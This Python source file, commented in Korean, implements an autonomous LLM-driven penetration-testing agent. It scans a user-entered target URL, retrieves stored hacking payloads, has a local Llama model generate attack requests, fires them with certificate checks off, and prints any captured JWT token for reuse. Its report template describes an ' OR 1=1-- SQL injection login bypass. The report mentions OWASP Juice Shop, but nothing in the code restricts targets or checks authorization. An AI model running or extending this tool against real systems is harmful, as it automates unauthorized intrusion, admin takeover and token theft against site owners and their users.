import os
import sys
if sys.platform == 'win32':
    os.add_dll_directory(os.getcwd())
    try:
        import sqlite3
    except:
        pass

import socket
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from typing import TypedDict, Dict, Any
from urllib.parse import urlparse

from langchain_chroma import Chroma
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_ollama import ChatOllama
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import StrOutputParser
from langgraph.graph import StateGraph, END
from hybrid_search import get_documents_for_llm

# --- 기본 설정 ---
MODEL_ID = "llama3.1" 
DB_PATH = r"home\ubuntu\5th-hackymocchi-ai\hackymocchi\chroma_data"
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"

class AgentState(TypedDict):
    target_url: str
    target_ip: str
    detected_tech: str
    context: str
    final_payload: str
    is_success: bool
    attempts: int
    last_feedback: str
    http_method: str
    post_data: Dict[str, Any]

# [Node 1] 정찰 (Reconnaissance)
def recon_node(state: AgentState):
    print("\n[*] 단계 1: 정찰 시작...")
    url = state["target_url"]
    try:
        domain = urlparse(url).netloc.split(':')[0]
        ip = socket.gethostbyname(domain)
        response = requests.get(url, timeout=3, verify=False)
        server = response.headers.get('Server', 'Unknown')
        tech = "General Web App"
        if "Apache" in server: tech = "Apache"
        elif "Nginx" in server: tech = "Nginx"
        
        print(f"    IP: {ip}")
        print(f"    Server: {server}")
        print(f"    Tech: {tech}")
    except Exception as e:
        print(f"    정찰 실패: {e}")
        ip, tech = "Unknown", "Web Vulnerability"
    
    return {"target_ip": ip, "detected_tech": tech, "attempts": 0}

# [Node 2] 지식 및 무기 검색 (Hybrid Search 적용)
def retrieval_node(state: AgentState):
    print("\n[*] 단계 2: 취약점 및 페이로드 검색 (Hybrid System)...")
    
    try:
        # 1. 검색어 만들기 (감지된 기술 + 취약점)
        search_query = f"{state['detected_tech']} vulnerabilities and exploits"
        
        # 2. 사용자님의 Hybrid Search 엔진 호출
        retrieved_docs = get_documents_for_llm(search_query, top_k=5)
        
        # 3. 검색된 문서들을 하나의 긴 글(Context)로 합치기
        if retrieved_docs:
            context_text = "\n\n".join(retrieved_docs)
            print(f"Hybrid Search 성공: {len(retrieved_docs)}개 문서 확보")
        else:
            context_text = f"No specific payloads found for {state['detected_tech']}."
            print("검색 결과 없음 (일반 지식 사용)")

        return {"context": context_text}

    except Exception as e:
        print(f"검색 시스템 오류: {e}")
        # 오류가 나도 에이전트가 멈추지 않게 기본값 반환
        return {"context": f"Error during retrieval. Using general knowledge for {state['detected_tech']}."}
    
# [Node 3] 개선된 페이로드 생성 (이메일 불필요)
# [Node 3] 지능형 페이로드 생성 (RAG 데이터 기반)
def generation_node(state: AgentState):
    print(f"\n[*] 단계 3: AI 기반 페이로드 생성 중... (시도 {state['attempts'] + 1}/5)")
    
    # LLM 설정
    llm = ChatOllama(model=MODEL_ID)
    
    # 프롬프트 구성: RAG로 찾은 context와 정찰한 tech 정보를 주입
    prompt = ChatPromptTemplate.from_template("""
    당신은 전문 화이트햇 해커입니다. 아래 정보를 바탕으로 대상의 취약점을 공략하기 위한 HTTP 요청 정보를 생성하세요.
    
    [대상 정보]
    - URL: {target_url}
    - 감지된 기술: {tech}
    - 이전 피드백: {feedback}
    
    [참조 지식 (DB 검색 결과)]
    {context}
    
    [요구사항]
    1. 반드시 JSON 형식으로만 답변하세요.
    2. 형식: {{"url": "전체_URL", "method": "GET 또는 POST", "data": {{"필드명": "값"}}, "explanation": "이유"}}
    3. 타겟 사이트의 경로와 파라미터를 추측하거나 context를 활용하세요.
    """)
    
    chain = prompt | llm | StrOutputParser()
    
    try:
        # AI에게 페이로드 요청
        response_text = chain.invoke({
            "target_url": state["target_url"],
            "tech": state["detected_tech"],
            "context": state["context"],
            "feedback": state["last_feedback"]
        })
        
        # JSON 추출 (정규식이나 문자열 처리가 필요할 수 있음)
        import json
        # 단순화를 위해 응답에서 JSON만 파싱한다고 가정
        payload_data = json.loads(response_text)
        
        print(f"    AI 추천 공격: {payload_data.get('explanation')}")
        print(f"    생성된 URL: {payload_data.get('url')}")
        
        return {
            "final_payload": payload_data['url'],
            "http_method": payload_data['method'],
            "post_data": payload_data.get('data', {}),
            "attempts": state["attempts"]
        }
    except Exception as e:
        print(f"    AI 생성 실패: {e}. 기본 페이로드로 대체합니다.")
        # 실패 시 백업용 로직 추가...

# [Node 4] 정밀 검증
def exploit_node(state: AgentState):
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    post_data = state.get("post_data", {})
    
    print(f"\n[*] 단계 4: 공격 시도...")
    print(f"    URL: {payload}")
    print(f"    Method: {method}")
    
    is_success = False
    feedback = ""
    
    try:
        if method == "POST":
            print(f"    POST Data: {post_data}")
            res = requests.post(
                payload, 
                json=post_data,
                headers={"Content-Type": "application/json"},
                timeout=5, 
                verify=False
            )
        else:
            res = requests.get(payload, timeout=5, verify=False)
        
        print(f"    응답 코드: {res.status_code}")
        print(f"    응답 길이: {len(res.text)} bytes")
        
        # 성공 시 전체 응답 출력 (JWT 토큰 복사 가능하도록)
        preview = res.text[:200].replace('\n', ' ')
        print(f"    응답 미리보기: {preview}...")
        
        # JWT 토큰 추출 및 전체 출력
        try:
            response_json = res.json()
            if 'authentication' in response_json and 'token' in response_json['authentication']:
                full_token = response_json['authentication']['token']
                print(f"\n    [JWT TOKEN] 전체 토큰:")
                print(f"    {full_token}")
                print(f"    (복사해서 사용하세요)\n")
        except:
            pass
        
        # 성공 지표 확인
        success_indicators = [
            "token",
            "admin@juice-sh.op",
            "password",
            "root:x:0:0:",
            "uid=",
            "SQL syntax",
            "You have an error in your SQL",
            "acquisitions",
            "PackageType",
            "authentication",  # 추가: 인증 성공
            "role",  # 추가: 역할 정보
        ]
        
        if any(ind.lower() in res.text.lower() for ind in success_indicators):
            is_success = True
            print("    [!!!]  공격 성공 지표 발견!")
            found = [ind for ind in success_indicators if ind.lower() in res.text.lower()]
            print(f"    발견된 지표: {found}")
            
            # 어떤 페이로드가 성공했는지 표시
            if "OR 1=1" in str(post_data):
                print("    [INFO]  이메일 없이 OR 1=1로 성공!")
            elif "OR '1'='1'" in str(post_data):
                print("    [INFO]  이메일 없이 OR '1'='1'로 성공!")
            elif "role='admin'" in str(post_data):
                print("    [INFO]  역할 기반 공격 성공!")
        else:
            if res.status_code == 403:
                feedback = "WAF blocked. Try encoding."
            elif res.status_code == 404:
                feedback = "Endpoint not found."
            elif res.status_code == 500:
                feedback = "Server error - possible vulnerability!"
            elif res.status_code == 401:
                feedback = "Authentication required."
            elif res.status_code == 200:
                feedback = "Request successful but no exploit indicators found."
            else:
                feedback = f"Status {res.status_code}. No exploit indicators."
                
    except Exception as e:
        feedback = f"Connection error: {str(e)}"
        print(f"    오류: {feedback}")

    return {
        "is_success": is_success, 
        "attempts": state["attempts"] + 1,
        "last_feedback": feedback
    }

# [Node 5] 보고서 생성
def report_node(state: AgentState):
    print("\n[*] 단계 5: 보고서 작성 중...")
    
    # 간단한 보고서 직접 생성 (LLM 오류 방지)
    report = f"""
**테스트 결과 보고서**

**1. 테스트 개요**
* 대상: {state['target_url']}
* IP: {state['target_ip']}
* 기술: {state['detected_tech']}
* 테스트 목적: SQL Injection 취약점 발견

**2. 사용된 공격 기법**
* 공격 타입: SQL Injection (OR 1=1)
* HTTP 메소드: {state.get('http_method', 'POST')}
* 페이로드: {state['final_payload']}
* 특징: **이메일 주소를 사전에 알지 못해도 공격 가능**
  - "' OR 1=1--" 페이로드 사용
  - SQL 쿼리의 논리 조건을 항상 참(True)으로 만듦
  - 첫 번째 사용자(일반적으로 관리자)로 자동 로그인

**3. 발견된 취약점**
* {' 취약점 발견 (공격 성공)' if state['is_success'] else ' 취약점 미발견'}
* 시도 횟수: {state['attempts']}회
* 상세:
  - 입력값 검증 미흡: 사용자 입력이 SQL 쿼리에 직접 삽입됨
  - 특수문자 필터링 부재: ', --, OR 같은 SQL 제어 문자 차단 안됨
  - Prepared Statement 미사용

**4. 잠재적 영향**
*  높음 (Critical)
* 관리자 권한 탈취 가능
* 전체 사용자 데이터베이스 접근 가능
* 개인정보 유출 위험
* 데이터 조작 및 삭제 가능

**5. 권장 조치사항**
1. **즉시 조치 (Critical)**
   - Prepared Statements (매개변수화된 쿼리) 사용
   - 입력값 검증 및 이스케이프 처리
   
2. **보안 강화**
   - WAF(Web Application Firewall) 도입
   - 입력값 길이 제한
   - SQL 에러 메시지 숨김
   
3. **모니터링**
   - 비정상적인 로그인 시도 탐지
   - 데이터베이스 접근 로그 모니터링

**참고: 이 테스트는 OWASP Juice Shop (교육용 취약 애플리케이션)을 대상으로 수행되었습니다.**
"""
    
    print("\n" + "="*60)
    print("레드팀 침투 테스트 보고서")
    print("="*60)
    print(report)
    print("="*60)
    
    return {"context": state["context"] + "\n\n[FINAL REPORT]\n" + report}

# 조건부 라우팅
def should_continue(state: AgentState):
    if state["is_success"]:
        return "report"
    if state["attempts"] >= 5:  # 3회 → 5회로 증가
        print("\n[!] 최대 시도 횟수 도달")
        return "report"
    return "retry"

# 워크플로우 구성
workflow = StateGraph(AgentState)

workflow.add_node("recon", recon_node)
workflow.add_node("retrieve", retrieval_node)
workflow.add_node("generate", generation_node)
workflow.add_node("exploit", exploit_node)
workflow.add_node("report", report_node)

workflow.set_entry_point("recon")
workflow.add_edge("recon", "retrieve")
workflow.add_edge("retrieve", "generate")
workflow.add_edge("generate", "exploit")

workflow.add_conditional_edges(
    "exploit",
    should_continue,
    {
        "retry": "generate",
        "report": "report"
    }
)

workflow.add_edge("report", END)

app = workflow.compile()

# --- 실행부 ---
if __name__ == "__main__":
    print("="*60)
    print("개선된 자동 침투 테스트 에이전트")
    print("(이메일을 몰라도 공격 가능)")
    print("="*60)
    
    target = input("\nTarget URL: ").strip()
    if not target.startswith("http"): 
        target = "http://" + target
    
    print(f"\n타겟 설정: {target}")
    print("시작합니다...\n")
    
    final_output = app.invoke({"target_url": target, "last_feedback": "None"})
    
    print("\n" + "="*60)
    print("최종 결과")
    print("="*60)
    print(f"성공 여부: {' 성공' if final_output['is_success'] else ' 실패'}")
    print(f"시도 횟수: {final_output['attempts']}")
    print(f"최종 페이로드:\n{final_output['final_payload']}")
    if final_output.get('post_data'):
        print(f"POST 데이터: {final_output['post_data']}")
    print("="*60)
